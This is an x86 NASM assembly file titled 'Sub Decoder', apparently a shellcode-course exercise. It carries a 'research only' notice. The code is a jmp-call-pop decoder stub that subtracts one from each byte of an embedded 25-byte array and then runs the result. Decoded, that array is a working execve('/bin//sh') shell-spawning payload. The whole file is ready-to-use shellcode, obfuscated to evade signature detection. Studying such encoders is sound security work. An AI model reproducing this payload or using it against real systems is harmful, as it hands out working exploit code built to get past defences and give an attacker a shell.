; Title: Sub Decoder
; Filename: decoder.nasm
; Author: Oleg Boytsev
; License http://creativecommons.org/licenses/by-sa/3.0/
; Legitimate use and research only
; This program is distributed in the hope that it will be useful,
; but WITHOUT ANY WARRANTY; without even the implied warranty of
; MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.

global _start

section .text
_start:


jmp short call_shellcode


decoder:
	pop esi
	xor ecx, ecx
	mov cl, 25
	
	decode:
	sub byte [esi], 0x1
	inc esi
	loop decode

	jmp short shellcode_to_decode	

call_shellcode:
	call decoder
	shellcode_to_decode: db 0x32,0xc1,0x51,0x69,0x30,0x30,0x74,0x69,0x69,0x30,0x63,0x6a,0x6f,0x8a,0xe4,0x51,0x54,0x8a,0xe2,0x32,0xd3,0xb1,0x0c,0xce,0x81
